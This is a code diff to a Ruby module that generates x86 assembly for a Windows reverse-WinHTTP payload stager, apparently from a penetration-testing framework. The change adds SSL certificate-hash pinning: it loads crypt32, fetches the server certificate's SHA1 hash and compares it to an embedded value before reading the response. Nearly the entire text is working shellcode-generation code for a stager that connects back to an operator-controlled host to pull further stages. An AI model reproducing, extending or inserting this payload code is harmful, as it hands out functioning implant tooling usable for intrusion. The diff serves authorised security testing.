@@ -104,17 +104,28 @@ module Payload::Windows::ReverseWinHttp
   def asm_reverse_winhttp(opts={})
 
 
+    verify_ssl = nil
+    encoded_cert_hash = nil
+
     #
-    # options should contain:
-    #    ssl:     (true|false)
-    #    url:     "/url_to_request"
-    #   host:     [hostname]
-    #   port:     [port]
-    # exitfunk:   [process|thread|seh|sleep]
+    # options can contain contain:
+    #    ssl:           (true|false)
+    #    url:           "/url_to_request"
+    #   host:           [hostname]
+    #   port:           [port]
+    # exitfunk:         [process|thread|seh|sleep]
+    # verify_ssl:       (true|false)
+    # verify_cert_hash: (40-byte SHA1 hash)
     #
 
     encoded_url   = asm_generate_wchar_array(opts[:url])
     encoded_host  = asm_generate_wchar_array(opts[:host])
+
+    if opts[:ssl] && opts[:verify_cert] && opts[:verify_cert_hash]
+      verify_ssl = true
+      encoded_cert_hash = opts[:verify_cert_hash].unpack("C*").map{|c| "0x%.2x" % c }.join(",")
+    end
+
 
     http_open_flags = 0
 
@@ -137,7 +148,20 @@ module Payload::Windows::ReverseWinHttp
         push esp               ; Push a pointer to the "winhttp" string
         push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
         call ebp               ; LoadLibraryA( "winhttp" )
+      ^
 
+    if verify_ssl
+      asm << %Q^
+        load_crypt32:
+          push 0x00323374        ; Push the string 'crypt32',0
+          push 0x70797263        ; ...
+          push esp               ; Push a pointer to the "crypt32" string
+          push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
+          call ebp               ; LoadLibraryA( "wincrypt" )
+        ^
+    end
+
+    asm << %Q^
       set_retry:
         push.i8  6             ; retry 6 times
         pop edi
@@ -215,7 +239,7 @@ module Payload::Windows::ReverseWinHttp
         push 0x91BB5895        ; hash( "winhttp.dll", "WinHttpSendRequest" )
         call ebp
         test eax,eax
-        jnz receive_response   ; if TRUE call WinHttpReceiveResponse API
+        jnz check_response     ; if TRUE call WinHttpReceiveResponse API
 
       try_it_again:
         dec edi
@@ -237,10 +261,77 @@ module Payload::Windows::ReverseWinHttp
           ^
       end
 
+      # Jump target if the request was sent successfully
+      asm << %Q^
+        check_response:
+        ^
+
+      # Verify the SSL certificate hash
+      if verify_ssl
+
+        asm << %Q^
+          ssl_cert_get_context:
+            push.i8 4
+            mov ecx, esp         ; Allocate &bufferLength
+            push.i8 0
+            mov ebx, esp         ; Allocate &buffer (ebx will point to *pCert)
+
+            push ecx             ; &bufferLength
+            push ebx             ; &buffer
+            push.i8 78           ; DWORD dwOption (WINHTTP_OPTION_SERVER_CERT_CONTEXT)
+            push esi             ; hHttpRequest
+            push 0x272F0478      ; hash( "winhttp.dll", "WinHttpQueryOption" )
+            call ebp
+            test eax, eax        ;
+            jz failure           ; Bail out if we couldn't get the certificate context
+
+                                 ; ebx
+          ssl_cert_allocate_hash_space:
+            push.i8 20           ;
+            mov ecx, esp         ; Store a reference to the address of 20
+            sub esp,[ecx]        ; Allocate 20 bytes for the hash output
+            mov edi, esp         ; edi will point to our buffer
+
+          ssl_cert_get_server_hash:
+            push ecx             ; &bufferLength
+            push edi             ; &buffer (20-byte SHA1 hash)
+            push.i8 3            ; DWORD dwPropId (CERT_SHA1_HASH_PROP_ID)
+            push [ebx]           ; *pCert
+            push 0xC3A96E2D      ; hash( "crypt32.dll", "CertGetCertificateContextProperty" )
+            call ebp
+            test eax, eax        ;
+            jz failure           ; Bail out if we couldn't get the certificate context
+
+          ssl_cert_start_verify:
+            call ssl_cert_compare_hashes
+            db #{encoded_cert_hash}
+
+          ssl_cert_compare_hashes:
+            pop ebx              ; ebx points to our internal 20-byte certificate hash (overwites *pCert)
+                                 ; edi points to the server-provided certificate hash
+
+            push.i8 4            ; Compare 20 bytes (5 * 4) by repeating 4 more times
+            pop ecx              ;
+            mov edx, ecx         ; Keep a reference to 4 in edx
+
+          ssl_cert_verify_compare_loop:
+            mov eax, [ebx]       ; Grab the next DWORD of the hash
+            cmp eax, [edi]       ; Compare with the server hash
+            jnz failure          ; Bail out if the DWORD doesn't match
+            add ebx, edx         ; Increment internal hash pointer by 4
+            add edi, edx         ; Increment server hash pointer by 4
+            loop ssl_cert_verify_compare_loop
+
+          ; Our certificate hash was valid, hurray!
+          ssl_cert_verify_cleanup:
+            xor ebx, ebx         ; Reset ebx back to zero
+          ^
+      end
+
       asm << %Q^
         receive_response:
                                  ; The API WinHttpReceiveResponse needs to be called
-                                 ; first to get a valid handler for WinHttpReadData
+                                 ; first to get a valid handle for WinHttpReadData
           push ebx               ; Reserved (NULL) [2]
           push esi               ; Request handler returned by WinHttpSendRequest [1]
           push 0x709D8805        ; hash( "winhttp.dll", "WinHttpReceiveResponse" )
